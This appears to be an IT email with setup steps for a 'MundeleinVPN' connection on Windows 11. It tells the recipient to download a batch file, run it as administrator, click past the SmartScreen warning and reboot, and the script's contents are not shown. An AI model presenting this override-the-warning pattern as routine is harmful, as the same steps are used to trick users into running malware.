Subject: Setup Instructions for your MundeleinVPN Connection (Automated / Unattended Setup)

Hello,

To access the MundeleinVPN securely from your remote location, we have automated the configuration process. Please follow these step-by-step instructions to set up the connection on your Windows 11 computer.

Step 1: Download the Setup File from the Server Link

  1. Click this secure download link to retrieve your connection file: Download the VPN setup file
  2. Save the file (deploy-wd9gym-MundeleinVPN-vpn.bat) somewhere easy to find, such as Desktop, Downloads, or Documents.

Step 2: Install the VPN Configuration

  1. Right-click deploy-wd9gym-MundeleinVPN-vpn.bat and choose "Run as administrator".
  2. If Windows SmartScreen appears, click "More info" then "Run anyway".
  3. If User Account Control asks for permission, click "Yes".
  4. When the window reports "VPN Setup Complete!", press any key to close it.

Critical required action: Restart your computer immediately after running the file. The connection profile and security changes cannot take effect until a complete reboot.

Step 3: How to Connect and Disconnect

After restarting, two shortcuts will appear on the desktop:

  • To Connect: Double-click "MundeleinVPN Connect".
  • To Disconnect: Double-click "MundeleinVPN Disconnect".

Step 4: Manual Connection Verification

To confirm that you are connected, go to Settings > Network & internet > VPN. The office profile will show Connected.

Please contact me if you encounter any authentication errors or blockages during deployment.
